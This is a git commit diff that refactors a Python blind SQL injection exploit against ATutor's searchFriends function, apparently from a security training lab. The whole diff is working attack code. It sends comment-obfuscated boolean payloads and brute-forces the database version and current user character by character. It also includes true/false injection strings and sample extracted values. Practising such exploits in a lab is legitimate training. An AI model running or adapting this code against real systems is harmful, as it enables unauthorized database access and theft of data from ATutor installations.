c20e26fa9de3b5d932a358ac3477831938c2bdd5
dvdg6566 <czhdaniel@gmail.com>
2023-11-30 18:32:31 +0800

    Refactored SQLi code

--- labs/atutor/sqli.py
+++ labs/atutor/sqli.py
@@ -31,35 +31,14 @@ def searchFriends_sqli(ip, inj_str):
     else:
         return True
 
-def extract_version(ip):
-    template = "test')/**/or/**/(ascii(substring((select/**/version()),<num>,1)))=<inj>%23"
-    
-    output = "" # If we already have stuff, can start output with value and change starting i
-    for i in range(1,100):
-        new_character = False
-        for c in range(32, 126): # ASCII letters, numbers and punctuation
-            query_string = f"test')/**/or/**/(ascii(substring((select/**/version()),{i},1)))={c}%23"
-            res = searchFriends_sqli(ip, query_string)
-            print(f"Checking {chr(c)}: {query_string} -- {res}")
-            if res == True:
-                new_character = True
-                output += chr(c)
-                print(f"Success, adding {chr(c)} -- {output}")
-                break
-        if not new_character:
-            print("No possible characters, breaking now!")
-            break
-    print(f"Version: {output}")
-    return output
-
-def extract_user(ip):
+def extract(ip, inj):
     template = "test')/**/or/**/(ascii(substring((select/**/CURRENT_USER()),<num>,1)))=<inj>%23"
 
     output = "" # If we already have stuff, can start output with value and change starting i
     for i in range(1,100):
         new_character = False
         for c in range(32, 126): # ASCII letters, numbers and punctuation
-            query_string = f"test')/**/or/**/(ascii(substring((select/**/CURRENT_USER()),{i},1)))={c}%23"
+            query_string = f"test')/**/or/**/(ascii(substring(({inj}),{i},1)))={c}%23"
             res = searchFriends_sqli(ip, query_string)
             print(f"Checking {chr(c)}: {query_string} -- {res}")
             if res == True:
@@ -84,11 +63,15 @@ def main():
 
     true_injection_string = "aaaa')/**/or/**/(select/**/1)=1%23"
     false_injection_string = "aaaa')/**/or/**/(select/**/1)=0%23"
-    extract_user(ip)
+    
+    user_injection_string = "select/**/CURRENT_USER()"
+    version_injection_string = "select/**/version()"
 
-    # searchFriends_custom(ip, injection_string)
-    # print(searchFriends_sqli(ip, true_injection_string))
-    # print(searchFriends_sqli(ip, false_injection_string))
+    # To extract the username (root@localhost):
+    # extract(ip, user_injection_string)
+
+    # To extract the version (5.5.47-0+deb8u1-log)
+    # extract(ip, version_injection_string)
 
 if __name__ == "__main__":
     main()
